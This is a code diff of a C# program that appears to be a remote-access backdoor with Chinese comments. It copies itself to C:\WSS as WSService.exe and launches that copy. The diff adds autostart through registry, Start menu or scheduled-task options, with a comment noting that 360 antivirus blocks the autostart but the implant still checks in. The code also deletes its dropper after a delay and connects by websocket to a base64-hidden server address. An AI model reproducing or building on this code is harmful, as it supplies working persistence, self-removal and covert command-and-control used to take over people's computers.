@@ -28,22 +28,23 @@ namespace websocket
         static void Main(string[] args)
         {
             //string nowPath = System.IO.Directory.GetCurrentDirectory();
-            //string targetPath = @"E:\WSS";
+            //string targetPath = @"E:\test\2";
             //判断自身是否在特定目录
             //if (nowPath != targetPath)
-            string RootPath = @"E:\WSS";//要释放的路径
+            string RootPath = @"C:\WSS\";//要释放的路径
             string ServiceName = "WSService";//要生成的文件名
-            int startupCode = 0;//0:启动项启动 1:注册表启动
+            int startupCode = 1;//0:开始菜单启动 1:注册表启动 2:计划任务启动 [会被360拦截导致自启动失效 不过仍然会上线]
 
-            if (System.IO.Directory.Exists(RootPath) == false)//如果不存在就创建
+
+            if (!Directory.Exists(RootPath))//如果不存在就创建
             {
-                System.IO.Directory.CreateDirectory(RootPath);
+                Directory.CreateDirectory(RootPath);
             }
 
             if (!IsProcessExist(ServiceName))
             {
                 string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-                string destinationPath = RootPath+ ServiceName+".exe";
+                string destinationPath = RootPath + ServiceName + ".exe";
                 //如果不存在就生成
                 if (!System.IO.File.Exists(destinationPath))
                 {
@@ -61,28 +62,30 @@ namespace websocket
                 sw1.WriteLine(path);
                 sw1.Close();
                 fs1.Close();
-                //设定目录启动项
-                //.......
-                //.......
                 //运行目标
                 MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
                 myWindowsCmd.StartCmd();
                 myWindowsCmd.RunCmd(destinationPath);
                 myWindowsCmd.WaitForExit();
                 myWindowsCmd.StopCmd();
-                
+                //设定目录启动项
+                StartupWay startupWay = new StartupWay();
+                startupWay.doStartUpWay(startupCode, RootPath, ServiceName);
             }
             else
             {
                 //删除生成器
-                string path = File.ReadAllText(RootPath + "path.ini", Encoding.Default);
-                string delCreate = "del " + path;
-                string delIni = "del " + RootPath + "path.ini";
-                MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
-                myWindowsCmd.StartCmd();
-                myWindowsCmd.RunCmd("ping -n 5 127.0.0.1>nul & " + delIni + " & " + delCreate);//延时五秒执行
-                myWindowsCmd.WaitForExit();
-                myWindowsCmd.StopCmd();
+                if (File.Exists(RootPath + "path.ini"))
+                {
+                    string path = File.ReadAllText(RootPath + "path.ini", Encoding.Default);
+                    string delCreate = "del " + path;
+                    string delIni = "del " + RootPath + "path.ini";
+                    MyWindowsCmd myWindowsCmd = new MyWindowsCmd();
+                    myWindowsCmd.StartCmd();
+                    myWindowsCmd.RunCmd("ping -n 5 127.0.0.1>nul & " + delIni + " & " + delCreate);//延时五秒执行
+                    myWindowsCmd.WaitForExit();
+                    myWindowsCmd.StopCmd();
+                }
                 string ip = "MTI3LjAuMC4x";//BASE64加密服务端IP
                 Base64Tools base64Tools = new Base64Tools();
                 string url = "ws://" + base64Tools.base64decode(ip) + ":7272";
@@ -107,9 +110,9 @@ namespace websocket
             // Console.ReadKey();
             // wb.stop();  //优雅的关闭，程序退出时需要关闭WebSocket连接
         }
-  
 
-        
+
+
     }
 
 }
